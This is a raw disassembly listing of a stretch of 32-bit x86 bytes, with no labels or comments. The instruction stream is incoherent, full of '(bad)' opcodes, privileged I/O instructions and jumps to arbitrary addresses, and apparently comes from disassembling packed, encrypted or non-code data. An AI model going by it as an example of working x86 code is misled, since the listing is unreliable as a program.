  414a60:	mov    dh,0x33
  414a62:	adc    eax,0x1fa8abab
  414a67:	cmc    
  414a68:	cmp    ch,BYTE PTR [ecx+eiz*2+0x4a]
  414a6c:	retf   0xde08
  414a6f:	sub    eax,0x79623076
  414a74:	jl     0x414a73
  414a76:	dec    esi
  414a77:	dec    eax
  414a78:	mov    edi,0x54579881
  414a7d:	adc    al,0x2
  414a7f:	stos   BYTE PTR es:[edi],al
  414a80:	lds    eax,FWORD PTR ds:0x3a2c07be
  414a86:	cmp    eax,0xb2b6f9a9
  414a8b:	push   ecx
  414a8c:	adc    al,0x38
  414a8e:	add    edx,edx
  414a90:	and    DWORD PTR [ecx-0x51],ebp
  414a93:	mov    esp,0xa50a5499
  414a98:	jecxz  0x414a5b
  414a9a:	cmp    eax,0xbbf64570
  414a9f:	fs fwait
  414aa1:	test   bl,bh
  414aa3:	mov    eax,0xd73acf33
  414aa8:	mov    edx,0x58d7be3c
  414aad:	aad    0xe3
  414aaf:	int3   
  414ab0:	cmp    al,0xf4
  414ab2:	cmp    DWORD PTR [edx+edi*8],esp
  414ab5:	mov    ecx,0x6d0af023
  414aba:	dec    ecx
  414abb:	inc    esi
  414abc:	mov    esi,0x6bcfe6c1
  414ac1:	int    0xe7
  414ac3:	or     BYTE PTR [ebx],ah
  414ac5:	test   al,0x40
  414ac7:	clc    
  414ac8:	lods   al,BYTE PTR ds:[esi]
  414ac9:	jecxz  0x414b00
  414acb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414acc:	mov    ds:0xa71332f5,eax
  414ad1:	xor    al,0x73
  414ad3:	rol    DWORD PTR [esi-0x535aac5b],1
  414ad9:	pop    ds
  414ada:	inc    ebx
  414adb:	cld    
  414adc:	push   0x3ba81eb
  414ae1:	outs   dx,DWORD PTR ds:[esi]
  414ae2:	imul   esp,DWORD PTR [esi],0x43
  414ae5:	pop    ebx
  414ae6:	mov    bh,0x13
  414ae8:	ret    
  414ae9:	xor    bl,dh
  414aeb:	jmp    0x6f75:0x7c1f93b7
  414af2:	pop    ds
  414af3:	or     ebp,edx
  414af5:	inc    ecx
  414af6:	xchg   edi,eax
  414af7:	or     al,0x1b
  414af9:	cmp    edi,ecx
  414afb:	outs   dx,DWORD PTR ds:[esi]
  414afc:	xchg   BYTE PTR [ebx+eax*4],bh
  414aff:	pop    es
  414b00:	outs   dx,DWORD PTR ds:[esi]
  414b01:	loope  0x414b0c
  414b03:	xor    BYTE PTR [ecx-0x47],al
  414b06:	ins    BYTE PTR es:[edi],dx
  414b07:	cmp    al,0x53
  414b09:	xchg   ecx,eax
  414b0a:	mov    ecx,0x16795826
  414b0f:	shr    DWORD PTR [edx],1
  414b11:	ins    DWORD PTR es:[edi],dx
  414b12:	rcl    DWORD PTR [ebp+0x65dbd964],1
  414b18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b19:	jne    0x414b98
  414b1b:	inc    eax
  414b1c:	(bad)  
  414b1e:	test   BYTE PTR [eax],ah
  414b20:	rol    DWORD PTR [edx-0x30d2bd24],1
  414b26:	xor    esi,esp
  414b28:	and    dh,BYTE PTR [edi]
  414b2a:	pusha  
  414b2b:	sub    BYTE PTR [esp+edx*1],al
  414b2e:	aas    
  414b2f:	aad    0xd1
  414b31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b32:	cmp    BYTE PTR [ecx+0x935c356],al
  414b38:	out    0xe9,eax
  414b3a:	test   eax,0x19a9381c
  414b3f:	xchg   BYTE PTR [ecx],bh
  414b41:	and    ebx,DWORD PTR ds:0x5b4ddaaa
  414b47:	retf   
  414b48:	or     ebp,DWORD PTR [ecx]
  414b4a:	imul   esi,DWORD PTR [eax-0x2c],0x2e
  414b4e:	std    
  414b4f:	adc    al,0x97
  414b51:	jg     0x414b3f
  414b53:	sub    BYTE PTR [esi+eiz*8-0x1a21bbda],al
  414b5a:	popf   
  414b5b:	ins    BYTE PTR es:[edi],dx
  414b5c:	ins    DWORD PTR es:[edi],dx
  414b5d:	out    0x88,al
  414b5f:	add    DWORD PTR [ecx],eax
  414b61:	rcl    edx,cl
  414b63:	popf   
  414b64:	fistp  WORD PTR ds:0x96f7b6ad
  414b6a:	dec    eax
  414b6b:	mov    edi,0xc272b289
  414b70:	and    BYTE PTR [ecx-0x65],bh
  414b73:	fist   DWORD PTR [ecx]
  414b75:	pop    es
  414b76:	jle    0x414afd
  414b78:	mov    edx,0xf20b8d0b
  414b7d:	lods   al,BYTE PTR cs:[esi]
  414b7f:	hlt    
  414b80:	pop    ss
  414b81:	aas    
  414b82:	mov    eax,0xcb4d944e
  414b87:	inc    eax
  414b88:	ins    BYTE PTR es:[edi],dx
  414b89:	ror    BYTE PTR [eax],1
  414b8b:	jb     0x414bf4
  414b8d:	prefetch BYTE PTR [edi-0x17]
  414b91:	scas   al,BYTE PTR es:[edi]
  414b92:	lock lods al,BYTE PTR ds:[esi]
  414b94:	retf   0x3443
  414b97:	jae    0x414bb9
  414b99:	pop    eax
  414b9a:	daa    
  414b9b:	leave  
  414b9c:	or     esi,DWORD PTR [edx-0x5ba121de]
  414ba2:	ffree  st(1)
  414ba4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ba5:	inc    BYTE PTR [edx-0x75]
  414ba8:	pop    ecx
  414ba9:	nop
  414baa:	es inc edi
  414bac:	(bad)  
  414bad:	ficom  WORD PTR [eax+0x1da3a313]
  414bb3:	or     DWORD PTR ss:[ebx],0xffffffe1
  414bb7:	test   al,0x3e
  414bb9:	dec    ebx
  414bba:	dec    ebx
  414bbb:	push   edx
  414bbc:	test   BYTE PTR [esi-0x4c],ch
  414bbf:	jge    0x414c39
  414bc1:	xchg   edx,eax
  414bc2:	ror    DWORD PTR [ecx-0x3b],0xef
  414bc6:	mov    DWORD PTR [edi],ecx
  414bc8:	inc    edx
  414bc9:	dec    eax
  414bca:	push   cs
  414bcb:	mov    eax,0xd7eb3307
  414bd0:	retf   
  414bd1:	adc    eax,0xb8dc89be
  414bd6:	add    al,0x25
  414bd8:	retf   
  414bd9:	pushf  
  414bda:	mov    esi,DWORD PTR [ebp-0x8]
  414bdd:	icebp  
  414bde:	mov    edi,0xe8b6b16d
  414be3:	aad    0xb5
  414be5:	pop    ecx
  414be6:	bound  edi,QWORD PTR ss:[eax]
  414be9:	or     al,0xaf
  414beb:	(bad)  
  414bed:	mov    esp,0xc7c9152d
  414bf2:	aam    0x2c
  414bf4:	ficom  DWORD PTR [esi]
  414bf6:	mov    ch,0xec
  414bf8:	cwde   
  414bf9:	nop
  414bfa:	mov    eax,ds:0x16cc4bd3
  414bff:	mov    dh,0x6b
  414c01:	fs or  eax,DWORD PTR fs:[ebx+0x5]
  414c06:	xchg   esi,eax
  414c07:	add    cl,ch
  414c09:	pop    ds
  414c0a:	fld    TBYTE PTR [eax-0x5f]
  414c0d:	sub    ch,BYTE PTR [edi-0x78]
  414c10:	mov    edi,0x6b36d698
  414c15:	fcomp  st(7)
  414c17:	pop    edx
  414c18:	iret   
  414c19:	pop    esp
  414c1a:	(bad)  
  414c1b:	fs pop es
  414c1d:	call   0x6a14:0xc012cc33
  414c24:	push   esi
  414c26:	imul   ebx,DWORD PTR es:[esi+0x1f],0xffffff9c
  414c2b:	adc    al,0x8
  414c2d:	mov    al,BYTE PTR [ebx+0x13]
  414c30:	adc    DWORD PTR [edx],ecx
  414c32:	xor    edi,DWORD PTR [ebx]
  414c34:	outs   dx,DWORD PTR ds:[esi]
  414c35:	push   ds
  414c36:	(bad)  
  414c38:	test   DWORD PTR ds:0xf2390728,ebp
  414c3e:	push   cs
  414c3f:	aaa    
  414c40:	adc    al,0xbd
  414c42:	(bad)  
  414c43:	jl     0x414c75
  414c45:	(bad)  
  414c46:	fsubr  DWORD PTR [eax-0x49]
  414c49:	sub    DWORD PTR [esi-0x7a],edx
  414c4c:	cld    
  414c4d:	jl     0x414c5c
  414c4f:	(bad)  
  414c50:	fiadd  WORD PTR [edx+edi*4+0x120c47a1]
  414c57:	imul   esi,DWORD PTR [esi-0x2],0xffffffae
  414c5b:	adc    eax,0x4e293c11
  414c60:	mov    ch,0x22
  414c62:	inc    edx
  414c63:	sbb    BYTE PTR [ecx],al
  414c65:	cmp    BYTE PTR [edx+eiz*4+0x47576f68],dl
  414c6c:	jge    0x414ccd
  414c6e:	aad    0xd5
  414c70:	js     0x414cb7
  414c72:	xchg   ecx,eax
  414c73:	fs out 0x6c,eax
  414c76:	aaa    
  414c77:	sbb    edx,edi
  414c79:	ret    
  414c7a:	(bad)  
  414c7b:	out    dx,eax
  414c7c:	fdivr  DWORD PTR [edx+eax*4]
  414c7f:	and    esi,DWORD PTR [esi+0x2b]
  414c82:	inc    edi
  414c83:	fdiv   QWORD PTR [eax+0x509a562f]
  414c89:	bound  ecx,QWORD PTR [ebp-0x10d58fd5]
  414c8f:	mov    ds:0x2b6836f,al
  414c94:	and    eax,0xe1bc8750
  414c99:	mov    ds:0x405c79a9,eax
  414c9e:	xchg   edi,eax
  414c9f:	stos   BYTE PTR es:[edi],al
  414ca0:	push   ss
  414ca1:	add    eax,0xf8b635f
  414ca6:	fmul   DWORD PTR [eax]
  414ca8:	rol    BYTE PTR [ebx+0x54a7603a],0xf7
  414caf:	mov    ecx,0x7b401e30
  414cb4:	pop    esi
  414cb5:	adc    al,0x67
  414cb7:	push   0xffffffa0
  414cb9:	aaa    
  414cba:	xor    BYTE PTR [ebp+0x41ed7ceb],ch
  414cc0:	push   ecx
  414cc1:	aaa    
  414cc2:	sub    DWORD PTR [ebx-0x7f],esi
  414cc5:	inc    edi
  414cc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cc7:	inc    esi
  414cc8:	sbb    DWORD PTR es:[ecx-0x7a],esp
  414ccc:	cld    
  414ccd:	lahf   
  414cce:	dec    esp
  414ccf:	cwde   
  414cd0:	cli    
  414cd1:	ror    ebp,cl
  414cd3:	sub    DWORD PTR [ecx],ecx
  414cd5:	pop    ss
  414cd6:	jmp    0xe758313e
  414cdb:	dec    ebx
  414cdc:	lahf   
  414cdd:	xor    esp,ecx
  414cdf:	(bad)  
  414ce0:	std    
  414ce1:	push   edi
  414ce2:	sar    BYTE PTR [eax],1
  414ce4:	pop    esp
  414ce5:	add    al,0x1c
  414ce7:	adc    eax,0x4b1cdde7
  414cec:	sub    eax,0xd3f2530b
  414cf1:	lds    edx,FWORD PTR [edi]
  414cf3:	sub    eax,0x4197cc24
  414cf8:	push   0xffffffd0
  414cfa:	sub    eax,0x7ee2ffe4
  414cff:	or     al,0xca
  414d01:	mov    al,0x12
  414d03:	ja     0x414d7c
  414d05:	jge    0x414c94
  414d07:	mov    dl,BYTE PTR [esi-0x2ab04c23]
  414d0d:	out    0x2a,eax
  414d0f:	leave  
  414d10:	jle    0x414d85
  414d12:	mov    cl,0xf8
  414d14:	(bad)  
  414d15:	bnd jbe 0x414d61
  414d18:	out    0x37,al
  414d1a:	or     ecx,eax
  414d1c:	out    dx,eax
  414d1d:	les    ecx,FWORD PTR [ebx+0xf]
  414d20:	cs push ebp
  414d22:	jae    0x414d61
  414d24:	sub    dl,dh
  414d26:	jmp    0xaa79d96e
  414d2b:	out    dx,al
  414d2c:	test   DWORD PTR [ebp+0x4732662d],edx
  414d32:	js     0x414d2a
  414d34:	jmp    0x335efef2
  414d39:	xchg   ecx,eax
  414d3a:	fild   DWORD PTR [ecx]
  414d3c:	mov    eax,ds:0x8088a575
  414d41:	xor    al,0x7d
  414d43:	dec    esi
  414d45:	mov    ecx,0x6fae03d0
  414d4a:	mov    ?,WORD PTR [ebp+0x1e]
  414d4d:	mov    bl,BYTE PTR [ecx+0x5c595f3b]
  414d53:	add    ecx,edx
  414d55:	cmc    
  414d56:	scas   al,BYTE PTR es:[edi]
  414d57:	cli    
  414d58:	mov    bl,0x12
  414d5a:	jne    0x414db1
  414d5c:	and    eax,0x284d2339
  414d61:	outs   dx,DWORD PTR ds:[esi]
  414d62:	and    BYTE PTR [eax-0x493f72a5],ch
  414d68:	and    eax,0xc282a145
  414d6d:	std    
  414d6e:	lods   al,BYTE PTR ds:[esi]
  414d6f:	leave  
  414d70:	or     eax,0xfdd390ee
  414d75:	mov    cl,bh
  414d77:	xchg   WORD PTR [esi],cx
  414d7a:	mov    edi,0x2132e94a
  414d7f:	mov    BYTE PTR [esi+edx*4-0xc],bl
  414d83:	jmp    0x6af4:0xb1731e1f
  414d8a:	ins    DWORD PTR es:[edi],dx
  414d8b:	clc    
  414d8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d8d:	ficom  WORD PTR [edi]
  414d8f:	dec    edi
  414d90:	pop    ss
  414d91:	scas   eax,DWORD PTR es:[edi]
  414d92:	add    ecx,DWORD PTR ss:[ebx]
  414d95:	jo     0x414d67
  414d97:	push   ds
  414d98:	mov    dl,0x28
  414d9a:	mov    eax,0x401a59e1
  414d9f:	mov    ds:0xdf10745b,eax
  414da4:	mov    al,0x4a
  414da6:	scas   eax,DWORD PTR es:[edi]
  414da7:	loopne 0x414d94
  414da9:	mov    ch,0x61
  414dab:	or     bl,BYTE PTR [edi-0x3c]
  414dae:	cmp    BYTE PTR [eax-0x7d6d33e8],0xfe
  414db5:	or     cl,ah
  414db7:	(bad)  
  414db8:	push   ebp
  414db9:	aad    0x59
  414dbb:	mov    gs,WORD PTR [esi-0x502631d2]
  414dc1:	pop    ss
  414dc2:	jno    0x414da6
  414dc4:	or     DWORD PTR [ecx],esp
  414dc6:	mov    edx,DWORD PTR ds:0xac80da68
  414dcc:	bound  esp,QWORD PTR [ebp-0x4f27be5f]
  414dd2:	sbb    bl,ch
  414dd4:	push   ecx
  414dd5:	inc    edx
  414dd6:	clc    
  414dd7:	gs aaa 
  414dd9:	ficomp WORD PTR [esp+ecx*4-0x73]
  414ddd:	cmp    bh,bl
  414ddf:	es int 0x91
  414de2:	inc    eax
  414de3:	outs   dx,DWORD PTR ds:[esi]
  414de4:	dec    ecx
  414de5:	inc    esp
  414de6:	lea    edi,[edi-0x5b638596]
  414dec:	ret    0x6265
  414def:	sbb    edi,ecx
  414df1:	js     0x414e56
  414df3:	cmc    
  414df4:	mov    edi,0x555d1f40
  414df9:	lds    edx,FWORD PTR [edi-0x10]
  414dfc:	dec    esp
  414dfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414dfe:	push   0x7d0f4a63
  414e03:	pop    eax
  414e04:	das    
  414e05:	sbb    bh,BYTE PTR [bp+0x3e76]
  414e0a:	in     al,dx
  414e0b:	mov    fs,WORD PTR [esi+0x75eb945a]
  414e11:	push   0x119c1a76
  414e16:	inc    esp
  414e17:	stos   DWORD PTR es:[edi],eax
  414e18:	or     BYTE PTR [ebx-0x27],dh
  414e1b:	leave  
  414e1c:	je     0x414e06
  414e1e:	add    dh,BYTE PTR [esi]
  414e20:	pop    ebp
  414e21:	(bad)  
  414e23:	sub    al,0x19
  414e25:	lds    esi,FWORD PTR [eax-0x2751cc24]
  414e2b:	stc    
  414e2c:	pop    ebp
  414e2d:	jbe    0x414e64
  414e2f:	and    al,BYTE PTR [eax]
  414e31:	test   al,0x9a
  414e33:	mov    ebp,0xede34620
  414e38:	cmc    
  414e39:	adc    eax,DWORD PTR [ebp+ebp*4-0x5e]
  414e3d:	call   0xe09c:0x1632663e
  414e44:	xchg   ebx,eax
  414e45:	xorps  xmm5,XMMWORD PTR [ebp-0x55]
  414e49:	mov    ebx,esi
  414e4b:	mov    dl,0xd3
  414e4d:	outs   dx,BYTE PTR ds:[esi]
  414e4e:	jne    0x414e0c
  414e50:	adc    BYTE PTR [esi+edi*1],cl
  414e53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e54:	mov    edx,0xadc9a188
  414e59:	lods   eax,DWORD PTR ds:[esi]
  414e5a:	add    al,0xd8
  414e5c:	in     eax,0xfc
  414e5e:	pop    edi
  414e5f:	int    0xa7
  414e61:	repz hlt 
  414e63:	or     DWORD PTR [ebx],edi
  414e65:	inc    ecx
  414e66:	jg     0x414e72
  414e68:	mov    al,ds:0x21d8d447
  414e6d:	(bad)  
  414e6e:	out    dx,al
  414e6f:	fld    TBYTE PTR [ebp+0x30]
  414e72:	out    0x4d,al
  414e74:	xchg   edx,eax
  414e75:	(bad)  
  414e76:	(bad)  
  414e77:	bound  edi,QWORD PTR [esp+esi*2+0xd2c371c]
  414e7e:	jo     0x414ea9
  414e80:	aaa    
  414e81:	push   eax
  414e82:	mov    BYTE PTR [edx-0x28ad95d0],ah
  414e88:	jmp    0xb177a293
  414e8d:	xchg   esp,eax
  414e8e:	sbb    DWORD PTR [ecx],eax
  414e90:	dec    ecx
  414e91:	dec    ebx
  414e92:	adc    DWORD PTR [eax+0x215eabd9],0xde3cc855
  414e9c:	push   esi
  414e9d:	inc    edi
  414e9e:	jnp    0x414e44
  414ea0:	out    0xde,eax
  414ea2:	dec    esp
  414ea3:	stos   DWORD PTR es:[edi],eax
  414ea4:	mov    ah,0x10
  414ea6:	mov    al,0x76
  414ea8:	lea    eax,[ecx-0x1d]
  414eab:	dec    eax
  414eac:	mov    cs,WORD PTR [ebx+0x8a56c44]
  414eb2:	test   ebp,0x3b62d497
  414eb8:	(bad)  
  414eb9:	rcl    DWORD PTR [ebp-0x6cffe9b2],cl
  414ebf:	std    
  414ec0:	or     eax,0x556716c1
  414ec5:	jecxz  0x414e6b
  414ec7:	retf   
  414ec8:	or     al,0x3
  414eca:	loop   0x414ede
  414ecc:	dec    ecx
  414ecd:	jmp    0x1661b226
  414ed2:	retf   0xc4e9
  414ed5:	push   ebx
  414ed6:	xlat   BYTE PTR ds:[ebx]
  414ed7:	or     esi,DWORD PTR [eax-0x6d]
  414eda:	mov    WORD PTR [ebx+0x143f0af5],fs
  414ee0:	push   ebp
  414ee1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ee2:	fild   DWORD PTR [ebp-0x19680829]
  414ee8:	fs xor bh,dh
  414eeb:	stos   DWORD PTR es:[edi],eax
  414eec:	rcl    esi,1
  414eee:	int3   
  414eef:	pop    ebp
  414ef0:	stc    
  414ef1:	xlat   BYTE PTR ds:[ebx]
  414ef2:	jno    0x414f49
  414ef4:	pop    ecx
  414ef5:	push   ebp
  414ef6:	xchg   ecx,eax
  414ef7:	jbe    0x414ecd
  414ef9:	in     eax,dx
  414efa:	xchg   edi,eax
  414efb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414efc:	mov    ah,0x12
  414efe:	push   ss
  414eff:	inc    eax
  414f00:	xchg   DWORD PTR [ebx-0x6984f3b7],ebx
  414f06:	mov    esi,0xe26f2416
  414f0b:	pop    edi
  414f0c:	into   
  414f0d:	stc    
  414f0e:	mov    cl,0x80
  414f10:	pop    esp
  414f11:	inc    ch
  414f13:	inc    edi
  414f14:	adc    dh,BYTE PTR [edx]
  414f16:	or     edx,DWORD PTR ds:0x89522144
  414f1c:	not    BYTE PTR [esi+edi*1]
  414f1f:	sbb    al,0x69
  414f21:	cmp    eax,0x3d73e7fe
  414f26:	hlt    
  414f27:	and    al,0xbf
  414f29:	cli    
  414f2a:	or     dl,BYTE PTR [eax+0x7b]
  414f2d:	es push ss
  414f2f:	xchg   ebp,eax
  414f30:	inc    edi
  414f31:	push   esp
  414f32:	enter  0xc174,0x44
  414f36:	inc    ebp
  414f37:	mov    eax,0xf8544ea1
  414f3c:	push   esp
  414f3d:	(bad)  
  414f3e:	pop    ecx
  414f3f:	and    dl,BYTE PTR [esi+0x1]
  414f42:	dec    edx
  414f43:	ret    0x99f9
  414f46:	dec    ebp
  414f47:	jno    0x414f96
  414f49:	sbb    al,0x4b
  414f4b:	pop    edx
  414f4c:	fild   QWORD PTR [ebp-0x223244e1]
  414f52:	es repz pop esi
  414f55:	fs jp  0x414fd3
  414f58:	mov    ah,0xf2
  414f5a:	or     esi,DWORD PTR [edx]
  414f5c:	repnz mov edi,0x507ce09b
  414f62:	cwde   
  414f63:	cld    
  414f64:	mov    esi,0x5cdfe3d5
  414f69:	xchg   edi,eax
  414f6a:	test   al,0x74
  414f6c:	mov    ch,0x1
  414f6e:	pop    ds
  414f6f:	retf   
  414f70:	inc    edx
  414f71:	and    eax,0xb8d97c7b
  414f76:	xchg   ecx,eax
  414f77:	nop
  414f78:	bound  ebx,QWORD PTR [esi]
  414f7a:	imul   esi,DWORD PTR [eax],0x4a9a6b71
  414f80:	lock arpl WORD PTR [ecx-0x47b064ef],sp
  414f87:	in     eax,dx
  414f88:	inc    ebp
  414f89:	add    DWORD PTR [eax],ebp
  414f8b:	jnp    0x414f8c
  414f8d:	call   0x7435386d
  414f92:	arpl   WORD PTR [ecx+0x7dfae29f],dx
  414f98:	or     ah,BYTE PTR [edx-0x7924dcc7]
  414f9e:	addr16 mov edi,0x7bc464be
  414fa4:	lods   al,BYTE PTR ds:[esi]
  414fa5:	add    BYTE PTR [esi],0xeb
  414fa8:	push   ds
  414fa9:	clc    
  414faa:	mov    ecx,0x7ad098a
  414faf:	repnz cdq 
  414fb1:	aam    0x21
  414fb3:	in     al,dx
  414fb4:	fwait
  414fb5:	in     eax,dx
  414fb6:	addr16 out 0xf3,al
  414fb9:	not    esp
  414fbb:	aas    
  414fbc:	test   BYTE PTR [edi],cl
  414fbe:	shr    BYTE PTR [eax-0x64],0x40
  414fc2:	adc    ch,BYTE PTR [eax-0x74]
  414fc5:	mov    ds:0x319de911,eax
  414fca:	jns    0x41502d
  414fcc:	pop    eax
  414fcd:	fwait
  414fce:	and    al,BYTE PTR [ebp+0x32]
  414fd1:	stc    
  414fd2:	fcom   DWORD PTR [ebx]
  414fd4:	cmp    DWORD PTR [edi+esi*8],esi
  414fd7:	repz jl 0x414fdc
  414fda:	jmp    0x30710431
  414fdf:	enter  0x588,0xcd
  414fe3:	ins    DWORD PTR es:[edi],dx
  414fe4:	test   dl,dl
  414fe6:	es adc dl,al
  414fe9:	mov    eax,ds:0xa63e9ae2
  414fee:	push   esp
  414fef:	rol    bl,cl
  414ff1:	add    bl,BYTE PTR [ebx-0x40]
  414ff4:	bound  ecx,QWORD PTR [edx+ebp*4-0x56b2fb8a]
  414ffb:	mov    bh,0x0
  414ffd:	outs   dx,DWORD PTR ds:[esi]
  414ffe:	pop    edx
  414fff:	aaa    
  415000:	xor    DWORD PTR [ecx-0x17],eax
  415003:	sbb    ecx,edi
  415005:	ins    BYTE PTR es:[edi],dx
  415006:	adc    ch,bh
  415008:	mov    ebp,0xc42c3693
  41500d:	jecxz  0x414fce
  41500f:	pop    ebx
  415010:	bound  edi,QWORD PTR [eax+ebx*8]
  415013:	popf   
  415014:	loopne 0x41500c
  415016:	(bad)  
  415017:	xlat   BYTE PTR ds:[ebx]
  415018:	and    eax,DWORD PTR [edi+0x21]
  41501b:	in     eax,dx
  41501c:	jg     0x41509b
  41501e:	pop    esi
  41501f:	sbb    al,BYTE PTR [ebx-0xe]
  415022:	push   ecx
  415023:	add    BYTE PTR [ebx-0x57118f13],bh
  415029:	xchg   edx,eax
  41502a:	jnp    0x41504b
  41502c:	sbb    BYTE PTR [esi],ah
  41502e:	dec    ebx
  41502f:	fsubr  DWORD PTR [eax]
  415031:	sub    BYTE PTR [edi-0x4b482dc5],bh
  415037:	test   ecx,esi
  415039:	mov    ds:0x515101d6,al
  41503e:	inc    ebx
  41503f:	adc    al,0x69
  415041:	gs dec edx
  415043:	adc    eax,0x201079d7
  415048:	add    al,dh
  41504a:	adc    DWORD PTR [ecx],0xf98d5710
  415050:	popa   
  415051:	dec    ebp
  415052:	add    al,0xae
  415054:	arpl   WORD PTR [edx-0x30],bx
  415057:	(bad)  
  415058:	iret   
  415059:	dec    esi
  41505a:	div    al
  41505c:	and    eax,0x485bb13d
  415061:	cmp    eax,0xbe0c63c8
  415066:	sbb    eax,0x644429d0
  41506b:	pop    esp
  41506c:	add    BYTE PTR [ecx-0x50],dh
  41506f:	push   0xe4e0af8f
  415074:	cdq    
  415075:	push   es
  415076:	pusha  
  415077:	int3   
  415078:	push   ecx
  415079:	cs daa 
  41507b:	xchg   edi,eax
  41507c:	push   ds
  41507d:	lds    edx,FWORD PTR [esi]
  41507f:	mov    ebp,0x4f4b9547
  415084:	adc    dl,BYTE PTR [esp+edx*4+0x1630dc56]
  41508b:	push   esi
  41508c:	fld    DWORD PTR [esi+0x2a]
  41508f:	(bad)  
  415090:	(bad)  
  415091:	cmp    DWORD PTR [edi],esi
  415093:	jo     0x4150cf
  415095:	sub    DWORD PTR [eax],ebp
  415097:	stos   DWORD PTR es:[edi],eax
  415098:	sub    al,0x9a
  41509a:	(bad)  
  41509b:	jg     0x415109
  41509d:	ss jae 0x41503c
  4150a0:	and    DWORD PTR [eax],edi
  4150a2:	js     0x41505a
  4150a4:	sbb    ebx,DWORD PTR [edi]
  4150a6:	push   edx
  4150a7:	and    eax,0x2826d481
  4150ac:	mov    ds:0xd3dbfc6b,al
  4150b1:	(bad)  
  4150b2:	test   BYTE PTR [ecx+edx*2-0x7de41d86],bh
  4150b9:	xchg   ecx,eax
  4150ba:	ret    
  4150bb:	dec    ebx
  4150bc:	enter  0xddbb,0xe6
  4150c0:	daa    
  4150c1:	xor    DWORD PTR [ebx+edx*1-0x2e],esp
  4150c5:	sbb    esi,esp
  4150c7:	int3   
  4150c8:	jmp    0x8d99e9f2
  4150cd:	data16 mov bh,0xce
  4150d0:	loope  0x415131
  4150d2:	cmp    BYTE PTR [eax+0x2a],bl
  4150d5:	pop    ss
  4150d6:	or     eax,0x32881236
  4150db:	push   0xe03b41ea
  4150e0:	scas   eax,DWORD PTR es:[edi]
  4150e1:	inc    ebp
  4150e2:	out    dx,eax
  4150e3:	mov    eax,0x203903ce
  4150e8:	fild   DWORD PTR [edx-0x2d]
  4150eb:	sbb    edi,DWORD PTR [eax]
  4150ed:	mov    ah,0x6b
  4150ef:	pop    es
  4150f0:	mov    esi,0x80b6bea7
  4150f5:	xchg   ebx,eax
  4150f6:	ins    DWORD PTR es:[edi],dx
  4150f7:	pop    ebp
  4150f8:	mov    al,0x1e
  4150fa:	outs   dx,DWORD PTR ds:[esi]
  4150fb:	sub    ebp,DWORD PTR [edx+0x3d564c9d]
  415101:	mov    cl,0xfb
  415103:	and    BYTE PTR [edi-0x7e],bh
  415106:	mov    ah,ch
  415108:	adc    DWORD PTR [ecx-0x538a9d4e],0x82f4d3f5
  415112:	test   DWORD PTR [esi+0x2],ecx
  415115:	dec    ebp
  415116:	jnp    0x41517d
  415118:	jle    0x415147
  41511a:	or     ebx,DWORD PTR [edx+eax*4+0x60]
  41511e:	cmp    al,0x65
  415120:	and    eax,0x1c832107
  415125:	popw   es
  415127:	lea    ebp,[edx]
  415129:	add    BYTE PTR [ebp-0x17],dl
  41512c:	jne    0x4150b4
  41512e:	iret   
  41512f:	mov    ebx,0x62e817da
  415134:	sub    eax,0xb37bcfe1
  415139:	das    
  41513a:	hlt    
  41513b:	icebp  
  41513c:	in     al,0x41
  41513e:	mov    bl,0xaf
  415140:	arpl   WORD PTR [ecx],ax
  415142:	arpl   di,ax
  415144:	push   edx
  415145:	xor    bh,BYTE PTR [ecx+edx*8+0x7e]
  415149:	mov    esp,0xca8a1f69
  41514e:	push   ecx
  41514f:	cmp    edi,esi
  415151:	cs fs dec esp
  415154:	nop
  415155:	and    eax,0x62aa9ec0
  41515a:	into   
  41515b:	and    al,0x39
  41515d:	mov    ah,0xd7
  41515f:	xchg   ebx,eax
  415160:	jmp    0x4150f3
  415162:	sbb    ebx,eax
  415164:	cs add esi,esp
  415167:	leave  
  415168:	or     al,0xde
  41516a:	jo     0x41512e
  41516c:	mov    BYTE PTR [edx+0x3d],al
  41516f:	sbb    BYTE PTR [edx+0x1c],dh
  415172:	ins    DWORD PTR es:[edi],dx
  415173:	mov    ds:0xe5307bee,al
  415178:	xor    bh,BYTE PTR [edi+0x63]
  41517b:	aam    0x5c
  41517d:	sub    ebp,eax
  41517f:	pop    esp
  415180:	push   edx
  415181:	bound  ebp,QWORD PTR [edi+0x43764a1c]
  415187:	into   
  415188:	push   esi
  415189:	dec    ecx
  41518a:	jae    0x41514f
  41518c:	mov    DWORD PTR [ebp-0x45],ebx
  41518f:	popf   
  415190:	inc    ebp
  415191:	mov    edx,0xea9fa708
  415196:	ins    DWORD PTR es:[edi],dx
  415197:	cmp    al,BYTE PTR [edi]
  415199:	pop    eax
  41519a:	add    dh,BYTE PTR ds:0x4ab75c12
  4151a0:	xor    bl,BYTE PTR [eax+ecx*2]
  4151a3:	mov    dl,0xc7
  4151a5:	sub    DWORD PTR [esi-0x55],edx
  4151a8:	mov    dl,0xe
  4151aa:	xchg   edx,eax
  4151ab:	pop    eax
  4151ac:	or     BYTE PTR [edx+0x6675f142],dl
  4151b2:	add    al,0xfb
  4151b4:	adc    ch,bh
  4151b6:	adc    al,0x29
  4151b8:	mov    al,0x96
  4151ba:	popa   
  4151bb:	xchg   DWORD PTR ds:0x99136437,esp
  4151c1:	adc    al,0x19
  4151c3:	call   0x7f79:0x316c127e
  4151ca:	cmc    
  4151cb:	jg     0x4151c6
  4151cd:	pop    eax
  4151ce:	xchg   ebx,eax
  4151cf:	mov    esp,0xb2002b15
  4151d4:	leave  
  4151d5:	add    BYTE PTR ds:0x7efbd22c,ch
  4151db:	lds    esi,FWORD PTR [edi+ebx*2-0x2b]
  4151df:	scas   eax,DWORD PTR es:[edi]
  4151e0:	cmp    BYTE PTR [ecx-0x66],bl
  4151e3:	mov    ebp,eax
  4151e5:	adc    al,0xed
  4151e7:	sbb    DWORD PTR [ebx+0x6a],ebp
  4151ea:	cdq    
  4151eb:	rol    DWORD PTR [ecx-0x77],cl
  4151ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
